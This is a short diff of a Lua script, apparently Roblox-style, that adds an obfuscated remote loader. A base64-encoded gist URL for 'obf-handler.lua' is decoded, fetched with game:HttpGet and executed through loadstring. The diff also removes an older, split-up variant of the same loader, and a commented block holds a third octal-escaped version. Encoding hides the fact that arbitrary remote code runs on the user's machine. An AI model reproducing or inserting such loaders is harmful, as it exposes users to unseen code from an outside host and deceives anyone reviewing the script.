@@ -52,6 +52,9 @@ function decodeink(data, autolaunch, mode)
     end
 end
 
+
+return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3L2RjZWZkODM5ZWY5NjUzNWUzMDZiNmE1NDE3YzA2ZDMzYTc2ZTViNjMvb2JmLWhhbmRsZXIubHVh",loadstring('return false')(),2))))()
+
 --[[
 api_decode = function(api_keys)
 if not api_keys then return nil end
@@ -61,8 +64,6 @@ end
 
 return loadstring(game:HttpGet(tostring(api_decode({[1]="81253c\48\56\55\52c84e33b5ae5c70a\99\50\57eaa9";[2]="\51\51"..loadstring('return "cf9f"')().."\50\49\98\97\102ea\100\51\52\102\56\57\49\54\97f114becaadc73\52\57\51\52";[3]="obf-handler."..webhold["file-type"].."";}))))()
 ]]--
-
-return loadstring(game:HttpGet(""..decodeink(webhold["legs"],loadstring('return false')(),1)..""..decodeink("ODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3L2RjZWZkODM5ZWY5NjUzNWUzMDZiNmE1NDE3YzA2ZDMzYTc2ZTViNjM=",loadstring('return false')(),2)..""..decodeink(webhold["head"],loadstring('return false')(),1)..""))()
 
 --[[
 local url = {}
